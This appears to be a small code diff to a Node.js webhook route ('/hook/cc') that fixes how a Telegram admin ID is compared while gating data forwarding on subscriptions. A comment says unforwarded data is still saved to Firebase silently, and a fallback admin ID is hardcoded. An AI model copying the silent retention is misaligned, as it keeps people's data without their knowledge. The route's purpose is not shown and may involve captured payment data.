@@ -31,8 +31,8 @@ router.post("/hook/cc", async (req, res) => {
     }
 
     // Only forward for users with an active subscription (or admin)
-    const ADMIN_ID = process.env["ADMIN_TELEGRAM_ID"] || "5741539104";
-    const isAdmin = ownerTelegramId === ADMIN_ID;
+    const ADMIN_ID = parseInt(process.env["ADMIN_TELEGRAM_ID"] || "5741539104", 10);
+    const isAdmin = Number(ownerTelegramId) === ADMIN_ID;
     const active = isAdmin || (await isSubscriptionActive(ownerTelegramId));
     if (!active) {
       // Still save to Firebase silently, but don't forward
